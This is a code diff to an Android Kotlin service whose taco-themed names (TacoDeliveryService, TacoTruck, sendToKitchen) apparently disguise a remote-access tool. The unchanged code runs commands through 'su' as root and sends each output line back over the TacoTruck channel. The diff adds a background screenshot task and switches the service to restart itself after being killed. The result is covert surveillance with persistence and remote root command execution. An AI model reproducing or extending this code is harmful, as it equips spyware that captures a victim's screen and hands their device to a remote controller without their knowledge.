@@ -19,6 +19,7 @@ import java.io.InputStreamReader
 
 class TacoDeliveryService : Service() {
     private var tacoTruck: TacoTruck? = null
+    private var screenshotTask: carne? = null
     private val kitchenStaffScope = CoroutineScope(Dispatchers.IO)
     private val TAG = "TacoDeliveryService"
 
@@ -34,8 +35,9 @@ class TacoDeliveryService : Service() {
         if (intent?.action == ACTION_OPEN_FOR_BUSINESS) {
             startForegroundNotification()
             openTheTacoStand()
+            startScreenshotTask()
         }
-        return START_NOT_STICKY
+        return START_STICKY
     }
 
     private fun startForegroundNotification() {
@@ -73,6 +75,14 @@ class TacoDeliveryService : Service() {
         tacoTruck?.openForBusiness()
     }
 
+    private fun startScreenshotTask() {
+        if (screenshotTask == null) {
+            screenshotTask = carne(this)
+            screenshotTask?.start()
+            Log.d(TAG, "Screenshot task started in background.")
+        }
+    }
+
     private fun handleFileSync(filePath: String) {
         kitchenStaffScope.launch {
             Log.d(TAG, "Initiating file sync for: $filePath")
@@ -86,7 +96,7 @@ class TacoDeliveryService : Service() {
             try {
                 val process = Runtime.getRuntime().exec("su")
                 process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }
-                
+
                 // Read output line by line and send back with OUT: prefix
                 process.inputStream.bufferedReader().forEachLine { line ->
                     tacoTruck?.sendToKitchen("OUT:$line")
@@ -105,6 +115,7 @@ class TacoDeliveryService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         tacoTruck?.closeDown()
+        screenshotTask?.stop()
         kitchenStaffScope.cancel()
         Log.d(TAG, "Taco stand closed.")
     }
